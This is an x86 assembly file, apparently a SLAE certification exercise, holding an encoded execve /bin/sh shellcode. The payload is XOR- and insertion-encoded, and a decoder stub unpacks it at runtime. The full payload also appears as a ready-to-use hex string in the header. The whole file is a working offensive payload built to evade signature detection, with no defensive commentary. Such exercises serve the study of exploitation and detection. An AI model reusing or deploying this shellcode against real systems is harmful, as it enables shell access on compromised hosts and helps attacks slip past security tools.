;Description: 	The original shellcode (execve /bin/sh) has been XOR-encoded (using the byte 0xf5) and then the Insertion-encoder has been applied (using byte 0xc5). The length is 151 bytes.
;Shellcode:	\xeb\x28\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1e\x80\xf3\xf5\x88\x5f\xff\x8a\x1c\x06\x80\xf3\xc5\x75\x13\x8a\x5c\x06\x01\x80\xf3\xf5\x88\x1f\x47\x04\x02\xeb\xea\xe8\xd3\xff\xff\xff\x1e\xc5\xd0\xc5\xab\xc5\x7c\xc5\x02\xc5\xc4\xc5\x35\xc5\xa5\xc5\x7c\xc5\x17\xc5\xa5\xc5\x76\xc5\x31\xc5\xf6\xc5\x78\xc5\x83\xc5\xf1\xc5\xc6\xc5\xf3\xc5\xa5\xc5\xc4\xc5\x35\xc5\xc6\xc5\xf2\xc5\xa5\xc5\x7c\xc5\x16\xc5\xc4\xc5\x35\xc5\xa5\xc5\x78\xc5\xce\xc5\xa2\xc5\x7c\xc5\x14\xc5\x45\xc5\xfe\xc5\x38\xc5\x75\xc5\x1d\xc5\x23\xc5\x0a\xc5\x0a\xc5\x0a\xc5\xda\xc5\xda\xc5\x97\xc5\x9c\xc5\x9b\xc5\xda\xc5\x86\xc5\x9d\xc5
;Author: 	Paolo Stivanin <https://github.com/polslinux>
;SLAE ID: 	526 

global _start
section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +1]
	xor eax,eax
	mov al,1
	xor ebx,ebx
	mov bl, byte [esi]
	xor bl, 0xf5
	mov byte [edi -1], bl

decode:
	mov bl, byte [esi + eax]
	xor bl, 0xc5
	jnz short EncodedShellcode
 	mov bl, byte [esi + eax + 1]
	xor bl, 0xf5
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode

call_shellcode:
	call decoder
	EncodedShellcode:db 0x1e,0xc5,0xd0,0xc5,0xab,0xc5,0x7c,0xc5,0x02,0xc5,0xc4,0xc5,0x35,0xc5,0xa5,0xc5,0x7c,0xc5,0x17,0xc5,0xa5,0xc5,0x76,0xc5,0x31,0xc5,0xf6,0xc5,0x78,0xc5,0x83,0xc5,0xf1,0xc5,0xc6,0xc5,0xf3,0xc5,0xa5,0xc5,0xc4,0xc5,0x35,0xc5,0xc6,0xc5,0xf2,0xc5,0xa5,0xc5,0x7c,0xc5,0x16,0xc5,0xc4,0xc5,0x35,0xc5,0xa5,0xc5,0x78,0xc5,0xce,0xc5,0xa2,0xc5,0x7c,0xc5,0x14,0xc5,0x45,0xc5,0xfe,0xc5,0x38,0xc5,0x75,0xc5,0x1d,0xc5,0x23,0xc5,0x0a,0xc5,0x0a,0xc5,0x0a,0xc5,0xda,0xc5,0xda,0xc5,0x97,0xc5,0x9c,0xc5,0x9b,0xc5,0xda,0xc5,0x86,0xc5,0x9d,0xc5
